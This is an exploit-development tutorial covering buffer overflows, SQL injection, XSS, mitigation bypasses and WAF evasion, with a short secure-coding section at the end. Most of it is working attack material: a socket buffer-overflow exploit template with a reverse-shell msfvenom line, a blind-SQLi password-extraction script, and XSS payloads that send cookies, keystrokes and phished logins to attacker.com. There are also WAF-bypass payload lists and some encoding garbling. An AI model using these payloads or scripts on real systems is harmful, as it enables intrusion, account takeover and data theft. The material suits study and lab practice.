


## 1. Core Concept of Exploit development 

### What is an Exploit?

AnÂ **exploit**Â is a piece of software, data, or sequence of commands that takes advantage of aÂ **vulnerability**Â in a system to cause unintended behavior â€” often leading to:

- Unauthorized access
- Data theft
- System compromise
- Denial of Service (DoS)
### Golden Rule: Always Test Safely

âœ… Use isolated VMs (VirtualBox/VMware)  
âœ… Never test on production systems  
âœ… Use intentionally vulnerable apps (e.g., VulnServer, OWASP Juice Shop, DVWA)  
âœ… Follow legal & ethical guidelines


### Core Vulnerability Types

#### 1. Buffer Overflow Attacks

##### **What it is:** 
- Occurs when a program writes more data to a buffer than it can hold
- The excess data "overflows" into adjacent memory locations
- Can overwrite critical data like return addresses or function pointers

**How it works:**
- Program allocates fixed-size buffer in memory
- User input exceeds buffer size
- Attacker can control what gets written to overflow area
- Can redirect program execution to malicious code

**Example scenario:**
```
char buffer[100];
strcpy(buffer, user_input); // If user_input > 100 chars, overflow occurs
```

**Key technical details:**

- Stack-based vs heap-based overflows
- Return address overwriting
- Shellcode injection techniques
- NOP sleds for reliable exploitation
##### **Types of Buffer Overflows**

**Stack-Based Buffer Overflow:**

- Most common type
- Occurs in stack memory
- Can overwrite return addresses
- Example vulnerable C code:

```c
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

```

**Heap-Based Buffer Overflow:**

- Occurs in dynamically allocated memory
- More complex to exploit
- Targets malloc/free implementations

##### **Exploitation Process**

1. **Fuzzing**: Send increasingly large inputs to find crash point
2. **Finding Offset**: Determine exact bytes to reach EIP/RIP
3. **Controlling EIP**: Overwrite return address
4. **Shellcode Placement**: Insert malicious code
5. **Execution**: Redirect flow to shellcode

##### **Python Exploit Template**

```python
#!/usr/bin/env python3
import socket
import sys

# Target configuration
target_ip = "192.168.1.100"
target_port = 9999

# Exploit components
offset = 146  # Bytes to EIP
eip = b"\\\\x83\\\\x16\\\\x50\\\\x62"  # JMP ESP address (little endian)
nop_sled = b"\\\\x90" * 16  # NOP sled for reliability

# msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -b "\\\\x00" -f python
shellcode = b"\\\\x31\\\\xc9\\\\x83\\\\xe9\\\\xaf\\\\xe8\\\\xff\\\\xff\\\\xff\\\\xff..."

# Build payload
payload = b"A" * offset
payload += eip
payload += nop_sled
payload += shellcode

# Send exploit
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(payload)
    s.close()
    print("[+] Exploit sent successfully!")
except Exception as e:
    print(f"[-] Error: {e}")

```



##### **Real-world impact:**

- Remote code execution
- Privilege escalation
- System compromise




#### 2. SQL Injection (SQLi)

**What it is:**

- Malicious SQL code inserted into application queries
- Exploits insufficient input validation
- Allows unauthorized database access


##### **Types of SQL Injection**

**1. Classic/In-Band SQLi:**

```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$input' AND password = '$pass'

-- Attack input: admin' OR '1'='1'--
-- Resulting query:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = ''

```

**2. Blind SQL Injection:**

- **Boolean-based**: Different responses for true/false conditions

```sql
-- Testing: id=1 AND 1=1 (true)
-- Testing: id=1 AND 1=2 (false)

```

- **Time-based**: Uses delays to infer data

```sql
-- MySQL: id=1 AND IF(1=1, SLEEP(5), 0)
-- MSSQL: id=1; WAITFOR DELAY '00:00:05'--

```

**3. Union-Based Injection:**

```sql
-- Find column count
id=1 ORDER BY 1--
id=1 ORDER BY 2--
id=1 ORDER BY 3-- (error = 2 columns)

-- Extract data
id=1 UNION SELECT username, password FROM users--

```


##### **Advanced SQLi Techniques**

**Database Enumeration:**

```sql
-- MySQL
SELECT @@version
SELECT database()
SELECT user()

-- PostgreSQL
SELECT version()
SELECT current_database()
SELECT current_user

-- MSSQL
SELECT @@version
SELECT DB_NAME()
SELECT USER_NAME()

```

**Data Extraction:**

```sql
-- Extract table names (MySQL)
UNION SELECT table_name, null FROM information_schema.tables--

-- Extract column names
UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--

-- Dump data
UNION SELECT concat(username,':',password), null FROM users--

```

##### **SQLi Automation Script**

```python
#!/usr/bin/env python3
import requests
import string

# Blind SQLi data extraction
def extract_data(url, param):
    extracted = ""
    charset = string.ascii_letters + string.digits + "!@#$%^&*()_+"

    for position in range(1, 50):
        for char in charset:
            # Boolean-based blind SQLi
            payload = f"' AND SUBSTRING((SELECT password FROM users LIMIT 1), {position}, 1)='{char}'--"

            response = requests.get(url, params={param: payload})

            if "Welcome" in response.text:  # Adjust based on true condition
                extracted += char
                print(f"[+] Found: {extracted}")
                break
        else:
            break

    return extracted

# Usage
password = extract_data("<http://vulnerable.com/login.php>", "username")
print(f"[!] Extracted password: {password}")

```

#### 3. Cross-Site Scripting (XSS)

##### **What it is:**

- Injection of malicious scripts into web applications
- Scripts execute in victim's browser context
- Bypasses same-origin policy

##### **Types of XSS**

**1. Reflected XSS (Non-Persistent):**

- Payload delivered via URL/form
- Immediate execution

```html
<!-- Vulnerable code -->
<?php echo "Search results for: " . $_GET['search']; ?>

<!-- Attack URL -->
<http://site.com/search.php?search=><script>alert(document.cookie)</script>

```

**2. Stored XSS (Persistent):**

- Payload stored in database
- Executes for all users viewing the content

```jsx
// Malicious comment stored in database
<script>
    var cookies = document.cookie;
    var img = new Image();
    img.src = "<http://attacker.com/steal.php?cookie=>" + encodeURIComponent(cookies);
</script>

```

**3. DOM-Based XSS:**

- Manipulation of DOM environment
- Client-side vulnerability

```jsx
// Vulnerable JavaScript
document.getElementById("output").innerHTML = location.hash.substring(1);

// Attack URL
<http://site.com/page.html#><img src=x onerror=alert(1)>

```

##### **XSS Payloads Collection**

**Basic Payloads:**

```jsx
// Simple alert
<script>alert('XSS')</script>

// Cookie theft
<script>document.location='<http://attacker.com/steal.php?c='+document.cookie></script>

// Keylogger
<script>
document.onkeypress = function(e) {
    var key = e.key;
    new Image().src = '<http://attacker.com/log.php?key=>' + key;
}
</script>

```

**Filter Bypass Techniques:**

```jsx
// Without script tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

// Encoding bypasses
<script>alert(String.fromCharCode(88,83,83))</script>  // "XSS"
<script>eval(atob('YWxlcnQoMSk='))</script>  // Base64

// Case variation
<ScRiPt>alert(1)</ScRiPt>

// Breaking up keywords
<scr<script>ipt>alert(1)</scr</script>ipt>

// Using HTML entities
&lt;script&gt;alert(1)&lt;/script&gt;

```

##### **Advanced XSS Exploitation**

**Session Hijacking:**

```jsx
<script>
// Steal session and send to attacker
var xhr = new XMLHttpRequest();
xhr.open('POST', '<http://attacker.com/steal>', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('cookie=' + encodeURIComponent(document.cookie) +
         '&url=' + encodeURIComponent(window.location.href));
</script>

```

**BeEF Hook Integration:**

```jsx
<script src="<http://attacker.com:3000/hook.js>"></script>

```

**Phishing via XSS:**

```jsx
<script>
// Create fake login form
document.body.innerHTML = `
<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);">
    <h2>Session Expired - Please Login</h2>
    <form action="<http://attacker.com/phish.php>" method="POST">
        <input type="text" name="username" placeholder="Username"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <input type="submit" value="Login">
    </form>
</div>`;
</script>

```


### Exploit Development Process

#### Research Phase

1. **Target identification**
    - Choose specific application/service
    - Version enumeration
    - Known vulnerability research
2. **Vulnerability analysis**
    - Static code analysis
    - Dynamic testing (fuzzing)
    - Reverse engineering
3. **Proof of concept development**
    - Minimal working exploit
    - Demonstrate impact
    - Document steps for reproduction

#### Development Tools & Languages

**Python for exploit development:**

- Excellent for network protocols
- Rich libraries (pwntools, requests, struct)
- Quick prototyping capabilities

**Example Python buffer overflow structure:**


```python
import socket
import struct

# Basic exploit template
target_ip = "192.168.1.100"
target_port = 9999

# Craft payload
padding = "A" * 146  # Offset to return address
eip = struct.pack("<I", 0x625011af)  # JMP ESP address
nop_sled = "\x90" * 16
shellcode = "\xfc\x48\x83\xe4..."  # Reverse shell code

payload = padding + eip + nop_sled + shellcode
```

**Assembly knowledge:**

- Understanding CPU registers (EAX, EBX, ESP, EIP)
- Stack operations (PUSH, POP, CALL, RET)
- Jump instructions and conditional branches

### Testing Environment Setup

**Isolated lab environment:**

- VirtualBox/VMware virtual machines
- Separate network segment
- Vulnerable applications for practice:
    - VulnHub VMs
    - Damn Vulnerable Web Application (DVWA)

**Essential tools:**

- **Debuggers:** GDB, Immunity Debugger, x64dbg
- **Disassemblers:** IDA Pro, Ghidra, Radare2
- **Network tools:** Wireshark, Burp Suite, OWASP ZAP
- **Fuzzing tools:** AFL, Peach Fuzzer, Boofuzz

---


### **ðŸ›¡ï¸ Security Mitigations**

#### **1. Address Space Layout Randomization (ASLR)**

##### **How ASLR Works**

- Randomizes memory addresses of:
    - Stack
    - Heap
    - Libraries
    - Main executable (PIE)
- Makes exploit reliability difficult

##### **Checking ASLR Status**

```bash
# Linux
cat /proc/sys/kernel/randomize_va_space
# 0 = Disabled
# 1 = Partial (stack/heap)
# 2 = Full randomization

# Windows (PowerShell as Admin)
Get-ItemProperty "HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Memory Management" -Name MoveImages

```

##### **ASLR Bypass Techniques**

**1. Information Leak:**

```python
# Leak memory address first
leaked_address = exploit_info_leak()
base_address = leaked_address - known_offset
system_addr = base_address + system_offset

```

**2. Brute Force (32-bit systems):**

```python
# Limited entropy on 32-bit
for attempt in range(1000):
    try:
        exploit(random_address)
        if success:
            break
    except:
        continue

```

**3. Partial Overwrites:**

```python
# Overwrite only lower bytes (non-randomized)
partial_overwrite = b"\\\\x34\\\\x12"  # Last 2 bytes only

```

#### **2. Data Execution Prevention (DEP/NX)**

##### **Understanding DEP**

- Marks memory regions as non-executable
- Prevents shellcode execution on stack/heap
- Hardware feature (NX bit on CPU)

##### **DEP Bypass Techniques**

**Return-Oriented Programming (ROP):**

```python
# Chain existing code gadgets
rop_chain = [
    pop_eax,      # gadget address
    0x41414141,   # value for EAX
    pop_ebx,      # gadget address
    0x42424242,   # value for EBX
    system_addr,  # call system()
    exit_addr,    # clean exit
    cmd_string    # "/bin/sh"
]

```

**Return-to-libc:**

```python
# Use existing library functions
payload = "A" * offset
payload += struct.pack("<I", system_addr)
payload += struct.pack("<I", exit_addr)
payload += struct.pack("<I", binsh_addr)

```

#### **3. Stack Canaries**

##### **How Canaries Work**

```
Stack layout with canary:
[Local Variables][Canary][Saved EBP][Return Address]

Before return:
if (canary != expected_value):
    abort()

```

##### **Canary Types**

1. **Terminator Canaries**: Contains null bytes, newlines
2. **Random Canaries**: Random value per execution
3. **Random XOR Canaries**: XORed with control data

##### **Bypass Techniques**

**1. Information Leak:**

```python
# Leak canary value first
canary = leak_canary_value()
payload = "A" * offset + canary + ebp + return_address

```

**2. Brute Force (Fork-based servers):**

```python
# Guess byte-by-byte
for byte_value in range(256):
    if try_byte(byte_value):
        canary += chr(byte_value)

```

#### **4. Web Application Firewalls (WAF)**

##### **Common WAF Products**

- ModSecurity
- Cloudflare
- AWS WAF
- Imperva
- Akamai

##### **WAF Detection**

```python
def detect_waf(url):
    # Send malicious payload
    response = requests.get(f"{url}?id=1' OR '1'='1")

    # Check for WAF signatures
    waf_signatures = {
        "Cloudflare": ["cf-ray", "cloudflare"],
        "ModSecurity": ["mod_security", "Mod_Security"],
        "AWS WAF": ["AWSALB", "AWS"],
        "Imperva": ["incap_ses", "visid_incap"],
        "Akamai": ["akamai", "akamai-ghost"]
    }

    for waf, signatures in waf_signatures.items():
        for signature in signatures:
            if signature.lower() in response.text.lower() or \\\\
               signature.lower() in str(response.headers).lower():
                return waf

    return "Unknown/None"

```

##### **WAF Bypass Techniques**

**1. Encoding Bypasses:**

```sql
-- URL encoding
id=1%27%20OR%20%271%27%3D%271

-- Double URL encoding
id=1%2527%20OR%20%25271%2527%253D%25271

-- Unicode encoding
id=1\\\\u0027 OR \\\\u00271\\\\u0027=\\\\u00271

-- HTML entity encoding
id=1&#39; OR &#39;1&#39;=&#39;1

```

**2. Case Variation:**

```sql
-- Mixed case
SeLeCt * FrOm users
sElEcT * fRoM users

```

**3. Comment Obfuscation:**

```sql
-- MySQL comments
SELECT/*comment*/* FROM users
SELECT/*!50000 * */ FROM users

-- Various comment styles
SELECT--/*comment*/* FROM users

```

**4. Whitespace Alternatives:**

```sql
-- Using comments as whitespace
SELECT/**/* FROM/**/users

-- Using other whitespace characters
SELECT%09*%09FROM%09users  -- TAB
SELECT%0A*%0AFROM%0Ausers  -- Newline

```

**5. SQLi WAF Bypass Examples:**

```python
# Advanced SQLi WAF bypass payloads
waf_bypass_payloads = [
    "1' AnD '1' LiKe '1",
    "1' aND '1' lIkE '1",
    "1'/**/OR/**/1=1",
    "1'/*!50000OR*/1=1",
    "1' OR 1#1=1",
    "1' OR 'abc'='abc",
    "1' OR substr(version(),1,1)='5",
    "1' /*!00000OR*/ 1=1",
    "1' OR ASCII(SUBSTR(version(),1,1))>0",
    "-1' UNION SELECT 1,2,3--",
    "-1' UNION ALL SELECT 1,2,3--",
    "1' AND (SELECT 1)=1--",
    "1' AND (SELECT 'x')='x'--"
]

```

**6. XSS WAF Bypass Examples:**

```jsx
// Using lesser-known event handlers
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>

// Using data URIs
<object data="data:text/html,<script>alert(1)</script>">

// Using alternative script sources
<script src="//â‘®.â‚¨">

// Character encoding tricks
<script>alert&lpar;1&rpar;</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

// Using SVG
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1)>

```

#### **5. Patching and Secure Coding**

#### **Buffer Overflow Prevention**

```c
// Vulnerable code
char buffer[100];
strcpy(buffer, user_input);  // BAD

// Secure alternatives
strncpy(buffer, user_input, sizeof(buffer)-1);  // Better
buffer[sizeof(buffer)-1] = '\\\\0';

// Or use safer functions
strlcpy(buffer, user_input, sizeof(buffer));  // BSD systems
snprintf(buffer, sizeof(buffer), "%s", user_input);  // Portable

```

##### **SQL Injection Prevention**

```python
# Vulnerable code
query = f"SELECT * FROM users WHERE id = {user_id}"  # BAD

# Parameterized queries (Secure)
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# Using ORM (SQLAlchemy example)
user = session.query(User).filter(User.id == user_id).first()

```

##### **XSS Prevention**

```python
# Python (Flask)
from markupsafe import escape
safe_output = escape(user_input)

# JavaScript
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

# PHP
$safe_output = htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

```

##### **Content Security Policy (CSP)**

```html
<!-- Strict CSP header -->
Content-Security-Policy: default-src 'self';
    script-src 'self' 'nonce-random123';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self'

```